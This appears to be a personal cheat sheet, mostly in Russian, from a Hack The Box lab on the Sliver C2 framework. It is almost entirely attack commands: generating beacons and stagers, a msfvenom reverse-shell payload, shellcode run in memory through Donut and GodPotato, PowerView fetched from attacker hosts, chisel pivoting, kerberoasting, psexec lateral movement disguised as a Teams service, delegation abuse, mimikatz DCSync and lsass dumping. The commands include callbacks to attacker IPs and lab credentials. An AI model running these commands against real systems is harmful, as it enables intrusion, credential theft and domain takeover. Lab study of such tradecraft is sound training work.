# Sliver
Sliver
# Устновка v1.5.42
    wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
    chmod +x ./sliver-server_linux
    new-operator -n student -l 10.10.14.193
    multiplayer

    get -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
    mxdelta@htb[/htb]$ chmod +x ./sliver-client_linux
    mxdelta@htb[/htb]$ ./sliver-client_linux import student_10.10.14.193.cfg 

    armory install seatbelt

  # Создание маячков и сессий
    generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows
    generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows

    generate --http 10.10.16.14:9001 --skip-symbols --os windows -N http-beacon-9001
    http -L 10.10.16.14 -l 9001

# Создание профилей и шелкодов
    Для использования загрузчика нам потребуется создать профиль, прослушиватель этапа и загрузчик, не забыв при этом сгенерировать полезную нагрузку через msfvenom. Обратите внимание, что используемые порты можно изменить в соответствии с вашими потребностями.

    profiles new --http 10.10.14.62:8088 --format shellcode htb

    stage-listener --url tcp://10.10.14.62:4443 --profile htb

    http -L 10.10.14.62 -l 8088

    generate stager --lhost 10.10.14.62 --lport 4443 --format csharp --save staged.txt
        //[*] Sliver implant stager saved to: /home/htb-ac590/staged.txt

    После создания поэтапной полезной нагрузки ( staged.txt), нам потребуется сгенерировать msfvenom aspx полезная нагрузка.
 
    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.62 LPORT=4443 -f aspx > sliver.aspx

    Далее нам потребуется принять сгенерированную полезную нагрузку. staged.txt и изменить полезную нагрузку в Page_Loadфункция. byte[]Массив будет определен под другим именем; очень важно указать это. new byte[511]массив из staged.txtв byte[] mO0UYобъявление в приведенном ниже примере в sliver.aspx файл. 

# Команда - загрузка - выгрузка
    download Pictures
    upload academy.txt C:\\Users\\eric\\Desktop\\academy.txt
    
# Команда - выполнить сборку 
    execute-assembly /home/htb-ac590/SharpCollection/NetFramework_4.0_Any/Seatbelt.exe -group=system
    Этот процесс можно наблюдать и при использовании расширения, эквивалентного оружейной. Seatbelt.
    
    sliver (http-session) > seatbelt -- -group=system
# Donut Setup (Donut — это инструмент, предназначенный для создания бинарных шеллкодов, которые могут быть выполнены в памяти; Donutсгенерирует шеллкод исполняемого файла .NET, который можно выполнить с помощью execute-shellcodeаргумент в Sliver. )
    git clone https://github.com/TheWover/donut
    mxdelta@htb[/htb]$ ./donut -i /home/htb-ac590/GodPotato-NET4.exe -a 2 -b 2 -p '-cmd c:\temp\http-beacon.exe' -o /home/htb-ac590/godpotato.bin
    generate beacon --http 10.10.14.62:9002 --skip-symbols -N http-beacon
    upload http-beacon.exe
    http --lhost 10.10.14.62 --lport 9002
    execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
        //[+] ProcessID       : 5668
    execute-shellcode -p 5668 /home/htb-ac590/godpotato.bin


# Разведка домена 
    echo -n "get-netuser | select  samaccountname,description" | base64 
    Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u
    sharpsh -- '-u http://10.10.14.62:8081/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u'
    execute-assembly /home/htb-ac590/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M

# Pivoting
    mxdelta@htb[/htb]$ git clone https://github.com/MrAle98/chisel
    sliver (http-beacon) > chisel
    mxdelta@htb[/htb]$ chisel server --reverse -p 1337 -v --socks5
    liver (http-beacon) > chisel client 10.10.14.62:1337 R:socks
    proxychains crackmapexec smb 172.16.1.12 -u svc_sql -p 'jkhnrjk123!'

# Kerberos Exploitation
    после установления сессии
    inline-execute-assembly /home/htb-ac590/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'
    inline-execute-assembly /home/htb-ac590/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'

    внутренние ресурсы
    proxychains bloodyAD --host 172.16.1.15 -d child.htb.local -u david -p 'Password123!' get object websec
    
    внутренний ресурс c2tc-kerberoast
    sliver (http-beacon) > c2tc-kerberoast roast websec (имя записи)
    Как только мы получим билет и сохраним его локально, мы воспользуемся им. TicketToHashcat.py.
    mxdelta@htb[/htb]$ python3 TicketToHashcat.py websec-ticket.enc 
    john roastme-13100.txt -w=/usr/share/wordlists/rockyou.txt
    
# Impersonation and Lateral Movement
    Создание токена пользователя (runas)

    generate --http 10.10.16.14:9001 --skip-symbols --os windows -N http-beacon-9001

    http -L 10.10.16.14 -l 9001

    use session/beacon

    make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
    биндим с удаленки на на наш средний сервер
    pivots tcp --bind 172.16.1.11 (запускаем слушатель на пой промежуточный хост)
    генерейтим бекон/servise
    generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot
    Jumping into the psexec utility, we must specify the path of the implant's binary.
    psexec --custom-exe /home/htb-ac590/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local (Запускаем бекон через psexec)
    мы оказываеися не хосте
    sessions
    pivot

# Kerberos Delegation
# Unconstrained Delegation
    rportfwd add -b 8080 -r 127.0.0.1:8080 (реверс порт форвардинг на средний хост)

    mxdelta@htb[/htb]$ echo "Get-NetComputer -Unconstrained" | base64 
    R2V0LU5ldENvbXB1dGVyIC1VbmNvbnN0cmFpbmVkCg==
    harpsh -- '-u http://172.16.1.11:8080/PowerView.ps1 -e -c R2V0LU5ldENvbXB1dGVyIC1VbmNvbnN0cmFpbmVkCg=='

    proxychains impacket-psexec child/svc_sql:jkhnrjk123\!@172.16.1.12
    PS C:\Windows\tasks> .\Rubeus.exe monitor /interval:5 /nowrap

    sliver (psexec-pivot) > inline-execute-assembly /home/htb-ac590/SpoolSample.exe 'dc01 srv01'
    PS C:\Windows\system32> [System.IO.File]::WriteAllBytes("C:\windows\temp\dc01.kirbi",[System.Convert]::FromBase64String("doIFJjCCBSKgA <SNIP> Q0hJTEQuSFRCLkxPQ0FMqSQwIqADAgECoRswGRsGa3JidGd0Gw9DSElMRC5IVEIuTE9DQUw="))
    C:\Windows\Tasks>.\mimikatz.exe "privilege::debug" "kerberos::ptt C:\windows\temp\dc01.kirbi" "lsadump::dcsync /domain:child.htb.local /user:child\administrator" "exit"

# Constrained Delegation
    sharpview Get-NetComputer -TrustedToAuth
    
    mxdelta@htb[/htb]$ python3 -m pypykatz lsa minidump web01-lsass

    inline-execute-assembly /home/htb-ac-1008/Rubeus.exe 'asktgt /user:web01$ /rc4:021b6a0d0e0ca246ec266bb72a481bc6 /nowrap'

    nline-execute-assembly /home/htb-ac-1008/Rubeus.exe 's4u /impersonateuser:carrot /msdsspn:eventsystem/srv02.child.htb.local /user:web01$ /ticket:doIE8DCCBOygAwIBBaEDAgEWoo<SNIP>sZC5odGIubG9jYWw= /nowrap'
    ls //srv02.child.htb.local/c$

    
# Dumping credentials on SRV02
    
